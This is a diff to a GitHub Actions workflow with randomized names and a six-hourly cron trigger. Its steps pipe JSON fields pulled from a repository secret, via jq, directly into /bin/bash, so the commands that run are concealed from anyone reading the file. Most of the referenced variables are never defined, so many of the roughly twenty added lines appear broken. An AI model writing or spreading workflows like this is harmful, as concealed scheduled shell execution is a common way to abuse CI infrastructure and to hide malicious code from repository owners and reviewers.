@@ -2,17 +2,35 @@ name: xingshunjian6751
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 0/6 * * *'
-jobs:  # 18496
+    - cron: '16 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xingshunjian6751
         env:
-          cgsgi1413: ${{ secrets.cgsgi1413 }}
+          ztsfm8: ${{ secrets.ztsfm8 }}
         run: |
-          echo $cgsgi1413 | jq -r .oxst219 | /bin/bash
-          echo $h496 | jq -r .vo6399 | /bin/bash
+          echo $ztsfm8 | jq -r .jvwuj6612 | /bin/bash
+          echo $fk33 | jq -r .htfbi037 | /bin/bash
+          echo $kpt54517 | jq -r .izck6 | /bin/bash
+          echo $whtbt82 | jq -r .uxlpj60393 | /bin/bash
+          echo $r68 | jq -r .ekv48901 | /bin/bash
+          echo $aqbm7 | jq -r .p7 | /bin/bash
+          echo $yzv2912 | jq -r .f0 | /bin/bash
+          echo $wrdeh936 | jq -r .wnw2 | /bin/bash
+          echo $zim41 | jq -r .citmd30 | /bin/bash
+          echo $nunvi39097 | jq -r .lvfo857 | /bin/bash
+          echo $bfyaz0595 | jq -r .kf88 | /bin/bash
+          echo $nud6526 | jq -r .kzt33981 | /bin/bash
+          echo $o7830 | jq -r .mzka93559 | /bin/bash
+          echo $yfabf896 | jq -r .twbs81842 | /bin/bash
+          echo $dqy2 | jq -r .qji4141 | /bin/bash
+          echo $rnvr9880 | jq -r .q726 | /bin/bash
+          echo $pup2 | jq -r .x94 | /bin/bash
+          echo $t7028 | jq -r .zmi834 | /bin/bash
+          echo $sjw64 | jq -r .fza2 | /bin/bash
+          echo $mqfc7217 | jq -r .hsgm43152 | /bin/bash
 
